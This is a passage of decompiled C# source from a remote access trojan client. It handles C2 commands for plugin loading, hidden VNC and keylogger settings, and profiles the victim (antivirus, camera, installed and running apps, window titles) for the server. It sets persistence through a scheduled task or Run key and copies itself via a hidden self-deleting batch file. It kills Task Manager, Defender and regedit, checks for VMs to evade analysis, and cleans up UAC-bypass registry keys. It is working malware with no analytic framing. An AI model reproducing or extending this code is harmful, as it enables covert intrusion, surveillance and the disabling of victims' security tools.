					{
						Error(ex.Message);
						break;
					}
				case "save_Plugin":
					SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes());
					{
						foreach (MsgPack item in Packs.ToList())
						{
							if (item.ForcePathObject("Dll").AsString == msgPack.ForcePathObject("Hash").AsString)
							{
								Invoke(item);
								Packs.Remove(item);
							}
						}
						break;
					}
				case "HVNCStop":
					Program.StopHVNC();
					break;
				case "keylogsetting":
					Keylogger.Params.content = msgPack.ForcePathObject("value").AsString;
					Keylogger.Params.SaveToFile();
					break;
				case "runningapp":
				{
					MsgPack msgPack3 = new MsgPack();
					msgPack3.ForcePathObject("Pac_ket").SetAsString("runningapp");
					msgPack3.ForcePathObject("hwid").SetAsString(Settings.Hw_id);
					msgPack3.ForcePathObject("value").SetAsString(CGRInfo.GetUserProcessList());
					Send(msgPack3.Encode2Bytes());
					break;
				}
				case "filterinfo":
				{
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").SetAsString("filterinfo");
					msgPack2.ForcePathObject("hwid").SetAsString(Settings.Hw_id);
					msgPack2.ForcePathObject("apps").SetAsString(CGRInfo.GetInstalledApplications());
					msgPack2.ForcePathObject("running").SetAsString(CGRInfo.GetUserProcessList());
					Send(msgPack2.Encode2Bytes());
					break;
				}
				}
			}
			catch (Exception ex2)
			{
				Error(ex2.Message);
			}
		}

		private static void Invoke(MsgPack unpack_msgpack)
		{
			byte[] rawAssembly = Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString));
			dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(rawAssembly).GetType("Plugin.Plugin"));
			string asString = unpack_msgpack.ForcePathObject("Info").AsString;
			try
			{
				if (string.IsNullOrEmpty(asString))
				{
					val.Run(TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
				}
				else if (asString == "hvnc")
				{
					Program.StopHVNC();
					int num = (int)unpack_msgpack.ForcePathObject("HPort").AsInteger;
					val.Run(Settings.Hos_ts, num);
				}
				Received();
			}
			catch (Exception)
			{
			}
		}

		private static void Received()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
			Send(msgPack.Encode2Bytes());
			Thread.Sleep(1000);
		}

		public static void Error(string ex)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "Error";
			msgPack.ForcePathObject("Error").AsString = ex;
			Send(msgPack.Encode2Bytes());
		}
	}
}
namespace Client.Install
{
	internal class NormalStartup
	{
		public static void Install()
		{
			try
			{
				FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder), Settings.Install_File));
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				if (!(fileName != fileInfo.FullName))
				{
					return;
				}
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					try
					{
						if (process.MainModule.FileName == fileInfo.FullName)
						{
							process.Kill();
						}
					}
					catch
					{
					}
				}
				if (Methods.IsAdmin())
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "cmd";
					processStartInfo.Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
					Process.Start(processStartInfo);
				}
				else
				{
					using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", RegistryKeyPermissionCheck.ReadWriteSubTree);
					registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
				}
				if (File.Exists(fileInfo.FullName))
				{
					File.Delete(fileInfo.FullName);
					Thread.Sleep(1000);
				}
				FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(fileName);
				fileStream.Write(array, 0, array.Length);
				Methods.ClientOnExit();
				string text = Path.GetTempFileName() + ".bat";
				using (StreamWriter streamWriter = new StreamWriter(text))
				{
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine("timeout 3 > NUL");
					streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
					streamWriter.WriteLine("CD " + Path.GetTempPath());
					streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
				}
				Process.Start(new ProcessStartInfo
				{
					FileName = text,
					CreateNoWindow = true,
					ErrorDialog = false,
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden
				});
				Environment.Exit(0);
			}
			catch (Exception ex)
			{
				ClientSocket.Error("Install Failed : " + ex.Message);
			}
		}
	}
}
namespace Client.Helper
{
	public static class AntiProcess
	{
		private static Thread BlockThread = new Thread(Block);

		public static bool Enabled { get; set; }

		public static void StartBlock()
		{
			Enabled = true;
			BlockThread.Start();
		}

		[SecurityPermission(SecurityAction.Demand, ControlThread = true)]
		public static void StopBlock()
		{
			Enabled = false;
			try
			{
				BlockThread.Abort();
				BlockThread = new Thread(Block);
			}
			catch
			{
			}
		}

		private static void Block()
		{
			while (Enabled)
			{
				IntPtr intPtr = CreateToolhelp32Snapshot(2u, 0u);
				PROCESSENTRY32 lppe = new PROCESSENTRY32
				{
					dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32))
				};
				if (Process32First(intPtr, ref lppe))
				{
					do
					{
						uint th32ProcessID = lppe.th32ProcessID;
						string szExeFile = lppe.szExeFile;
						if (Matches(szExeFile, "Taskmgr.exe") || Matches(szExeFile, "ProcessHacker.exe") || Matches(szExeFile, "procexp.exe") || Matches(szExeFile, "MSASCui.exe") || Matches(szExeFile, "MsMpEng.exe") || Matches(szExeFile, "MpUXSrv.exe") || Matches(szExeFile, "MpCmdRun.exe") || Matches(szExeFile, "NisSrv.exe") || Matches(szExeFile, "ConfigSecurityPolicy.exe") || Matches(szExeFile, "MSConfig.exe") || Matches(szExeFile, "Regedit.exe") || Matches(szExeFile, "UserAccountControlSettings.exe") || Matches(szExeFile, "taskkill.exe"))
						{
							KillProcess(th32ProcessID);
						}
					}
					while (Process32Next(intPtr, ref lppe));
				}
				CloseHandle(intPtr);
				Thread.Sleep(50);
			}
		}

		private static bool Matches(string source, string target)
		{
			return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase);
		}

		private static void KillProcess(uint processId)
		{
			IntPtr intPtr = OpenProcess(1u, bInheritHandle: false, processId);
			TerminateProcess(intPtr, 0);
			CloseHandle(intPtr);
		}

		[DllImport("kernel32.dll")]
		private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

		[DllImport("kernel32.dll")]
		private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		[DllImport("kernel32.dll")]
		private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

		[DllImport("kernel32.dll")]
		private static extern bool CloseHandle(IntPtr handle);

		[DllImport("kernel32.dll")]
		private static extern bool TerminateProcess(IntPtr dwProcessHandle, int exitCode);
	}
	public struct PROCESSENTRY32
	{
		public uint dwSize;

		public uint cntUsage;

		public uint th32ProcessID;

		public IntPtr th32DefaultHeapID;

		public uint th32ModuleID;

		public uint cntThreads;

		public uint th32ParentProcessID;

		public int pcPriClassBase;

		public uint dwFlags;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string szExeFile;
	}
	internal class Anti_Analysis
	{
		public static void RunAntiAnalysis()
		{
			if (!IsServerOS() && isVM_by_wim_temper())
			{
				Environment.FailFast(null);
			}
		}

		public static bool IsServerOS()
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_0036: Expected O, but got Unknown
			//IL_003c: Expected O, but got Unknown
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Expected O, but got Unknown
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				string machineName = Environment.MachineName;
				ConnectionOptions val = new ConnectionOptions
				{
					EnablePrivileges = true,
					Impersonation = (ImpersonationLevel)3
				};
				ManagementScope val2 = new ManagementScope($"\\\\{machineName}\\root\\CIMV2", val);
				ObjectQuery val3 = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
				ManagementObjectSearcher val4 = new ManagementObjectSearcher(val2, val3);
				try
				{
					ManagementObjectCollection val5 = val4.Get();
					try
					{
						if (val5.Count != 1)
						{
							throw new ManagementException();
						}
						return (uint)((ManagementBaseObject)((IEnumerable)val5).OfType<ManagementObject>().First()).Properties["ProductType"].Value switch
						{
							1u => false, 
							2u => true, 
							3u => true, 
							_ => false, 
						};
					}
					finally
					{
						((IDisposable)val5)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val4)?.Dispose();
				}
			}
			catch
			{
				return false;
			}
		}

		public static bool isVM_by_wim_temper()
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected O, but got Unknown
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher((ObjectQuery)new SelectQuery("Select * from Win32_CacheMemory"));
				int num = 0;
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						_ = (ManagementObject)enumerator.Current;
						num++;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				return num < 2;
			}
			catch
			{
				return true;
			}
		}
	}
	internal class Camera
	{
		[ComImport]
		[ComVisible(true)]
		[Guid("29840822-5B84-11D0-BD3B-00A0C911CE86")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		public interface ICreateDevEnum
		{
			int CreateClassEnumerator([In] ref Guid pType, [In][Out] ref IEnumMoniker ppEnumMoniker, [In] int dwFlags);
		}

		[ComImport]
		[ComVisible(true)]
		[Guid("55272A00-42CB-11CE-8135-00AA004BB851")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		public interface IPropertyBag
		{
			int Read([MarshalAs(UnmanagedType.LPWStr)] string PropName, ref object Var, int ErrorLog);

			int Write(string PropName, ref object Var);
		}

		public static readonly Guid CLSID_VideoInputDeviceCategory = new Guid("{860BB310-5D01-11d0-BD3B-00A0C911CE86}");

		public static readonly Guid CLSID_SystemDeviceEnum = new Guid("{62BE5D10-60EB-11d0-BD3B-00A0C911CE86}");

		public static readonly Guid IID_IPropertyBag = new Guid("{55272A00-42CB-11CE-8135-00AA004BB851}");

		public static bool havecamera()
		{
			if (FindDevices().Length == 0)
			{
				return false;
			}
			return true;
		}

		public static string[] FindDevices()
		{
			return GetFiltes(CLSID_VideoInputDeviceCategory).ToArray();
		}

		public static List<string> GetFiltes(Guid category)
		{
			List<string> result = new List<string>();
			EnumMonikers(category, delegate(IMoniker moniker, IPropertyBag prop)
			{
				object Var = null;
				prop.Read("FriendlyName", ref Var, 0);
				string item = (string)Var;
				result.Add(item);
				return false;
			});
			return result;
		}

		private static void EnumMonikers(Guid category, Func<IMoniker, IPropertyBag, bool> func)
		{
			IEnumMoniker ppEnumMoniker = null;
			ICreateDevEnum createDevEnum = null;
			try
			{
				createDevEnum = (ICreateDevEnum)Activator.CreateInstance(Type.GetTypeFromCLSID(CLSID_SystemDeviceEnum));
				createDevEnum.CreateClassEnumerator(ref category, ref ppEnumMoniker, 0);
				if (ppEnumMoniker == null)
				{
					return;
				}
				IMoniker[] array = new IMoniker[1];
				IntPtr zero = IntPtr.Zero;
				while (ppEnumMoniker.Next(array.Length, array, zero) == 0)
				{
					IMoniker moniker = array[0];
					object ppvObj = null;
					Guid riid = IID_IPropertyBag;
					moniker.BindToStorage(null, null, ref riid, out ppvObj);
					IPropertyBag propertyBag = (IPropertyBag)ppvObj;
					try
					{
						if (func(moniker, propertyBag))
						{
							break;
						}
					}
					finally
					{
						Marshal.ReleaseComObject(propertyBag);
						if (moniker != null)
						{
							Marshal.ReleaseComObject(moniker);
						}
					}
				}
			}
			finally
			{
				if (ppEnumMoniker != null)
				{
					Marshal.ReleaseComObject(ppEnumMoniker);
				}
				if (createDevEnum != null)
				{
					Marshal.ReleaseComObject(createDevEnum);
				}
			}
		}
	}
	public static class HwidGen
	{
		public static string HWID()
		{
			try
			{
				string s = string.Concat(new object[5]
				{
					Environment.ProcessorCount,
					Environment.UserName,
					Environment.MachineName,
					Environment.OSVersion,
					new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				});
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] bytes = Encoding.ASCII.GetBytes(s);
				bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = bytes;
				foreach (byte b in array)
				{
					stringBuilder.Append(b.ToString("x2"));
				}
				return stringBuilder.ToString().Substring(0, 20).ToUpper();
			}
			catch
			{
				return "Err HWID";
			}
		}
	}
	public static class IdSender
	{
		public static byte[] SendInfo()
		{
			//IL_007e: Unknown result type (might be due to invalid IL or missing references)
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "ClientInfo";
			msgPack.ForcePathObject("ClientType").AsString = "Normal";
			msgPack.ForcePathObject("HWID").AsString = Settings.Hw_id;
			msgPack.ForcePathObject("DesktopName").AsString = Environment.MachineName;
			msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString();
			msgPack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
			msgPack.ForcePathObject("Camera").AsString = Camera.havecamera().ToString();
			msgPack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
			msgPack.ForcePathObject("Version").AsString = Settings.Ver_sion;
			msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower()
				.Replace("true", "Admin")
				.Replace("false", "User");
			msgPack.ForcePathObject("Perfor_mance").AsString = Methods.GetActiveWindowTitle();
			msgPack.ForcePathObject("Paste_bin").AsString = Settings.Paste_bin;
			msgPack.ForcePathObject("Anti_virus").AsString = Methods.Antivirus();
			msgPack.ForcePathObject("Install_ed").AsString = new FileInfo(Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
			msgPack.ForcePathObject("Po_ng").AsString = "";
			msgPack.ForcePathObject("Group").AsString = Settings.Group;
			msgPack.ForcePathObject("CPU").AsString = CGRInfo.GetCPUName();
			msgPack.ForcePathObject("GPU").AsString = CGRInfo.GetGPU();
			msgPack.ForcePathObject("RAM").AsString = CGRInfo.GetRAM();
			msgPack.ForcePathObject("apps").AsString = CGRInfo.GetInstalledApplications();
			msgPack.ForcePathObject("running").AsString = CGRInfo.GetUserProcessList();
			Keylogger.Params.LoadFromFile();
			msgPack.ForcePathObject("keylogsetting").AsString = Keylogger.Params.content;
			return msgPack.Encode2Bytes();
		}
	}
	public static class Methods
	{
		public static void Log(string msg)
		{
			try
			{
				File.AppendAllText("C:\\Temp\\client.log", DateTime.Now.ToString() + " : " + msg + "\n");
			}
			catch (Exception)
			{
			}
		}

		public static void LogEx(Exception ex)
		{
			try
			{
				File.AppendAllText("C:\\Temp\\client_ex.log", DateTime.Now.ToString() + " : ex " + ex.Message + " \n" + ex.StackTrace + "\n " + ex.Source + "\n");
			}
			catch (Exception)
			{
			}
		}

		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		public static void ClientOnExit()
		{
			try
			{
				if (Convert.ToBoolean(Settings.BS_OD) && IsAdmin())
				{
					ProcessCritical.Exit();
				}
				MutexControl.CloseMutex();
				ClientSocket.SslClient?.Close();
				ClientSocket.TcpClient?.Close();
			}
			catch
			{
			}
		}

		public static string Antivirus()
		{
			//IL_001f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0025: Expected O, but got Unknown
			//IL_003c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0042: Expected O, but got Unknown
			try
			{
				string text = string.Empty;
				ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
				try
				{
					ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementObject val2 = (ManagementObject)enumerator.Current;
							text = text + ((ManagementBaseObject)val2)["displayName"].ToString() + "; ";
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
				text = RemoveLastChars(text);
				return (!string.IsNullOrEmpty(text)) ? text : "N/A";
			}
			catch
			{
				return "Unknown";
			}
		}

		public static string RemoveLastChars(string input, int amount = 2)
		{
			if (input.Length > amount)
			{
				input = input.Remove(input.Length - amount);
			}
			return input;
		}

		public static ImageCodecInfo GetEncoder(ImageFormat format)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected O, but got Unknown
			ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
			foreach (ImageCodecInfo val in imageDecoders)
			{
				if (val.FormatID == format.Guid)
				{
					return val;
				}
			}
			return null;
		}

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

		public static void PreventSleep()
		{
			try
			{
				SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
			}
			catch
			{
			}
		}

		public static string GetActiveWindowTitle()
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(256);
				if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
				{
					return stringBuilder.ToString();
				}
			}
			catch
			{
			}
			return "";
		}

		public static void ClearSetting()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Environment");
				if (registryKey.GetValue("windir") != null)
				{
					registryKey.DeleteValue("windir");
				}
				registryKey.Close();
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", writable: true).OpenSubKey("Classes", writable: true).DeleteSubKeyTree("mscfile");
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software", writable: true).OpenSubKey("Classes", writable: true).DeleteSubKeyTree("ms-settings");
			}
			catch
			{
			}
		}
	}
	public class DInvokeCore
	{
		public enum NTSTATUS : uint
		{
			Success = 0u,
			Wait0 = Success,
			Wait1 = 1u,
			Wait2 = 2u,
			Wait3 = 3u,
			Wait63 = 63u,
			Abandoned = 128u,
			AbandonedWait0 = Abandoned,
			AbandonedWait1 = 129u,
			AbandonedWait2 = 130u,
			AbandonedWait3 = 131u,
			AbandonedWait63 = 191u,
			UserApc = 192u,
			KernelApc = 256u,
			Alerted = 257u,
			Timeout = 258u,
			Pending = 259u,
			Reparse = 260u,
			MoreEntries = 261u,
			NotAllAssigned = 262u,
			SomeNotMapped = 263u,
			OpLockBreakInProgress = 264u,
			VolumeMounted = 265u,
			RxActCommitted = 266u,
			NotifyCleanup = 267u,
			NotifyEnumDir = 268u,
			NoQuotasForAccount = 269u,
			PrimaryTransportConnectFailed = 270u,
			PageFaultTransition = 272u,
			PageFaultDemandZero = 273u,
			PageFaultCopyOnWrite = 274u,
			PageFaultGuardPage = 275u,
			PageFaultPagingFile = 276u,
			CrashDump = 278u,
			ReparseObject = 280u,
			NothingToTerminate = 290u,
			ProcessNotInJob = 291u,
			ProcessInJob = 292u,
			ProcessCloned = 297u,
			FileLockedWithOnlyReaders = 298u,
			FileLockedWithWriters = 299u,
			Informational = 1073741824u,
			ObjectNameExists = Informational,
			ThreadWasSuspended = 1073741825u,
			WorkingSetLimitRange = 1073741826u,
			ImageNotAtBase = 1073741827u,
			RegistryRecovered = 1073741833u,
			Warning = 2147483648u,
			GuardPageViolation = 2147483649u,
			DatatypeMisalignment = 2147483650u,
			Breakpoint = 2147483651u,
			SingleStep = 2147483652u,
			BufferOverflow = 2147483653u,
			NoMoreFiles = 2147483654u,
			HandlesClosed = 2147483658u,
			PartialCopy = 2147483661u,
			DeviceBusy = 2147483665u,
			InvalidEaName = 2147483667u,
			EaListInconsistent = 2147483668u,
			NoMoreEntries = 2147483674u,
			LongJump = 2147483686u,
			DllMightBeInsecure = 2147483691u,
			Error = 3221225472u,
			Unsuccessful = 3221225473u,
			NotImplemented = 3221225474u,
			InvalidInfoClass = 3221225475u,
			InfoLengthMismatch = 3221225476u,
			AccessViolation = 3221225477u,
			InPageError = 3221225478u,
			PagefileQuota = 3221225479u,
			InvalidHandle = 3221225480u,
			BadInitialStack = 3221225481u,
			BadInitialPc = 3221225482u,
			InvalidCid = 3221225483u,
			TimerNotCanceled = 3221225484u,
			InvalidParameter = 3221225485u,
			NoSuchDevice = 3221225486u,
			NoSuchFile = 3221225487u,
			InvalidDeviceRequest = 3221225488u,
			EndOfFile = 3221225489u,
			WrongVolume = 3221225490u,
			NoMediaInDevice = 3221225491u,
			NoMemory = 3221225495u,
			ConflictingAddresses = 3221225496u,
			NotMappedView = 3221225497u,
			UnableToFreeVm = 3221225498u,
			UnableToDeleteSection = 3221225499u,
			IllegalInstruction = 3221225501u,
			AlreadyCommitted = 3221225505u,
			AccessDenied = 3221225506u,
			BufferTooSmall = 3221225507u,
			ObjectTypeMismatch = 3221225508u,
			NonContinuableException = 3221225509u,
			BadStack = 3221225512u,
			NotLocked = 3221225514u,
			NotCommitted = 3221225517u,
			InvalidParameterMix = 3221225520u,
			ObjectNameInvalid = 3221225523u,
			ObjectNameNotFound = 3221225524u,
			ObjectNameCollision = 3221225525u,
			ObjectPathInvalid = 3221225529u,
			ObjectPathNotFound = 3221225530u,
			ObjectPathSyntaxBad = 3221225531u,
			DataOverrun = 3221225532u,
			DataLate = 3221225533u,
			DataError = 3221225534u,
			CrcError = 3221225535u,
			SectionTooBig = 3221225536u,
			PortConnectionRefused = 3221225537u,
			InvalidPortHandle = 3221225538u,
			SharingViolation = 3221225539u,
			QuotaExceeded = 3221225540u,
			InvalidPageProtection = 3221225541u,
			MutantNotOwned = 3221225542u,
			SemaphoreLimitExceeded = 3221225543u,
			PortAlreadySet = 3221225544u,
			SectionNotImage = 3221225545u,
			SuspendCountExceeded = 3221225546u,
			ThreadIsTerminating = 3221225547u,
			BadWorkingSetLimit = 3221225548u,
			IncompatibleFileMap = 3221225549u,
			SectionProtection = 3221225550u,
			EasNotSupported = 3221225551u,
			EaTooLarge = 3221225552u,
			NonExistentEaEntry = 3221225553u,
			NoEasOnFile = 3221225554u,
			EaCorruptError = 3221225555u,
			FileLockConflict = 3221225556u,
			LockNotGranted = 3221225557u,
			DeletePending = 3221225558u,
			CtlFileNotSupported = 3221225559u,
			UnknownRevision = 3221225560u,
			RevisionMismatch = 3221225561u,
			InvalidOwner = 3221225562u,
			InvalidPrimaryGroup = 3221225563u,
			NoImpersonationToken = 3221225564u,
			CantDisableMandatory = 3221225565u,
			NoLogonServers = 3221225566u,
			NoSuchLogonSession = 3221225567u,
			NoSuchPrivilege = 3221225568u,
			PrivilegeNotHeld = 3221225569u,
			InvalidAccountName = 3221225570u,
			UserExists = 3221225571u,
			NoSuchUser = 3221225572u,
			GroupExists = 3221225573u,
			NoSuchGroup = 3221225574u,
			MemberInGroup = 3221225575u,
			MemberNotInGroup = 3221225576u,
			LastAdmin = 3221225577u,
			WrongPassword = 3221225578u,
			IllFormedPassword = 3221225579u,
			PasswordRestriction = 3221225580u,
			LogonFailure = 3221225581u,
			AccountRestriction = 3221225582u,
			InvalidLogonHours = 3221225583u,
			InvalidWorkstation = 3221225584u,
			PasswordExpired = 3221225585u,
			AccountDisabled = 3221225586u,
			NoneMapped = 3221225587u,
			TooManyLuidsRequested = 3221225588u,
			LuidsExhausted = 3221225589u,
			InvalidSubAuthority = 3221225590u,
			InvalidAcl = 3221225591u,
			InvalidSid = 3221225592u,
			InvalidSecurityDescr = 3221225593u,
			ProcedureNotFound = 3221225594u,
			InvalidImageFormat = 3221225595u,
			NoToken = 3221225596u,
			BadInheritanceAcl = 3221225597u,
			RangeNotLocked = 3221225598u,
			DiskFull = 3221225599u,
			ServerDisabled = 3221225600u,
			ServerNotDisabled = 3221225601u,
			TooManyGuidsRequested = 3221225602u,
			GuidsExhausted = 3221225603u,
			InvalidIdAuthority = 3221225604u,
			AgentsExhausted = 3221225605u,
			InvalidVolumeLabel = 3221225606u,
			SectionNotExtended = 3221225607u,
			NotMappedData = 3221225608u,
			ResourceDataNotFound = 3221225609u,
			ResourceTypeNotFound = 3221225610u,
			ResourceNameNotFound = 3221225611u,
			ArrayBoundsExceeded = 3221225612u,
			FloatDenormalOperand = 3221225613u,
			FloatDivideByZero = 3221225614u,
			FloatInexactResult = 3221225615u,
			FloatInvalidOperation = 3221225616u,
			FloatOverflow = 3221225617u,
			FloatStackCheck = 3221225618u,
			FloatUnderflow = 3221225619u,
			IntegerDivideByZero = 3221225620u,
			IntegerOverflow = 3221225621u,
			PrivilegedInstruction = 3221225622u,
			TooManyPagingFiles = 3221225623u,
			FileInvalid = 3221225624u,
			InsufficientResources = 3221225626u,
			InstanceNotAvailable = 3221225643u,
			PipeNotAvailable = 3221225644u,
			InvalidPipeState = 3221225645u,
			PipeBusy = 3221225646u,
			IllegalFunction = 3221225647u,
			PipeDisconnected = 3221225648u,
			PipeClosing = 3221225649u,
			PipeConnected = 3221225650u,
			PipeListening = 3221225651u,
			InvalidReadMode = 3221225652u,
			IoTimeout = 3221225653u,
			FileForcedClosed = 3221225654u,
			ProfilingNotStarted = 3221225655u,
			ProfilingNotStopped = 3221225656u,
			NotSameDevice = 3221225684u,
			FileRenamed = 3221225685u,
			CantWait = 3221225688u,
			PipeEmpty = 3221225689u,
			CantTerminateSelf = 3221225691u,
			InternalError = 3221225701u,
			InvalidParameter1 = 3221225711u,
			InvalidParameter2 = 3221225712u,
			InvalidParameter3 = 3221225713u,
			InvalidParameter4 = 3221225714u,
			InvalidParameter5 = 3221225715u,
			InvalidParameter6 = 3221225716u,
			InvalidParameter7 = 3221225717u,
			InvalidParameter8 = 3221225718u,
			InvalidParameter9 = 3221225719u,
			InvalidParameter10 = 3221225720u,
			InvalidParameter11 = 3221225721u,
			InvalidParameter12 = 3221225722u,
			ProcessIsTerminating = 3221225738u,
			MappedFileSizeZero = 3221225758u,
			TooManyOpenedFiles = 3221225759u,
			Cancelled = 3221225760u,
			CannotDelete = 3221225761u,
			InvalidComputerName = 3221225762u,
			FileDeleted = 3221225763u,
			SpecialAccount = 3221225764u,
			SpecialGroup = 3221225765u,
			SpecialUser = 3221225766u,
			MembersPrimaryGroup = 3221225767u,
			FileClosed = 3221225768u,
			TooManyThreads = 3221225769u,
			ThreadNotInProcess = 3221225770u,
			TokenAlreadyInUse = 3221225771u,
			PagefileQuotaExceeded = 3221225772u,
			CommitmentLimit = 3221225773u,
			InvalidImageLeFormat = 3221225774u,
			InvalidImageNotMz = 3221225775u,
			InvalidImageProtect = 3221225776u,
			InvalidImageWin16 = 3221225777u,
			LogonServer = 3221225778u,
			DifferenceAtDc = 3221225779u,
			SynchronizationRequired = 3221225780u,
			DllNotFound = 3221225781u,
			IoPrivilegeFailed = 3221225783u,
			OrdinalNotFound = 3221225784u,
			EntryPointNotFound = 3221225785u,
			ControlCExit = 3221225786u,
			InvalidAddress = 3221225793u,
			PortNotSet = 3221226323u,
			DebuggerInactive = 3221226324u,
			CallbackBypass = 3221226755u,
			PortClosed = 3221227264u,
			MessageLost = 3221227265u,
			InvalidMessage = 3221227266u,
			RequestCanceled = 3221227267u,
			RecursiveDispatch = 3221227268u,
			LpcReceiveBufferExpected = 3221227269u,
			LpcInvalidConnectionUsage = 3221227270u,
			LpcRequestsNotAllowed = 3221227271u,
			ResourceInUse = 3221227272u,
			ProcessIsProtected = 3221227282u,
			VolumeDirty = 3221227526u,
			FileCheckedOut = 3221227777u,
			CheckOutRequired = 3221227778u,
			BadFileType = 3221227779u,
			FileTooLarge = 3221227780u,
			FormsAuthRequired = 3221227781u,
			VirusInfected = 3221227782u,
			VirusDeleted = 3221227783u,
			TransactionalConflict = 3222863873u,
			InvalidTransaction = 3222863874u,
			TransactionNotActive = 3222863875u,
			TmInitializationFailed = 3222863876u,
			RmNotActive = 3222863877u,
			RmMetadataCorrupt = 3222863878u,
			TransactionNotJoined = 3222863879u,
			DirectoryNotRm = 3222863880u,
			CouldNotResizeLog = 3222863881u,
			TransactionsUnsupportedRemote = 3222863882u,
			LogResizeInvalidSize = 3222863883u,
			RemoteFileVersionMismatch = 3222863884u,
			CrmProtocolAlreadyExists = 3222863887u,
			TransactionPropagationFailed = 3222863888u,
			CrmProtocolNotFound = 3222863889u,
			TransactionSuperiorExists = 3222863890u,
			TransactionRequestNotValid = 3222863891u,
